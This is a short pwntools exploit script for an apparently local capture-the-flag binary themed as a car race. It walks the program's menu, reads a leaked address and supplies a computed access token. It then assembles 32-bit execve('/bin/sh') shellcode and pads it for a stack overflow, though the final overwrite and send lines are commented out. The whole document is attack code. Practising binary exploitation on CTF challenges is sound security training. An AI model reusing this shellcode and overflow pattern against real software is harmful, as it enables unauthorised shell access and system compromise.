from pwn import *

#host = os.environ['CI_REGISTRY_IMAGE'].replace('/', '-')
#p = remote(host, port)
p = process('./chall')
elf = ELF('./chall')

gdb.attach(p, gdbscript='''b*0x0804937f
c
''')

p.recv()
p.sendline('1')

p.recv()
p.sendline('1')

p.sendline('2')
p.recvuntil('2. Touring car racing\n')
p.sendline('2')

p.recvuntil('You may find your car at this location: ')
leak = u32(p.recvline()[:-1])
info("leak: %s"%hex(leak))

p.recvuntil('Give us your access token key: \n')
p.sendline(str(0x1337c0de ^ 0xc0cac0de))

p.recvuntil('Give us your navigation commands to win the race!\n')

shell = 'xor ecx, ecx\n'
shell += 'xor edx, edx\n'
shell += 'push eax\n'
shell += 'push 0x68732f\n'
shell += 'push 0x6e69622f\n'
shell += 'mov ebx, esp\n'
shell += 'push 0xb\n'
shell += 'pop eax\n'
shell += 'int 0x80\n'


shell = asm(shell)

#print(len(shell))
#eip = leak - 0x13
#info("eip: %s"%hex(eip))

pay = shell
pay += 'a'*(0x30 - len(shell))
#pay += p32(eip-0x30)

#p.sendline(pay)

p.interactive()
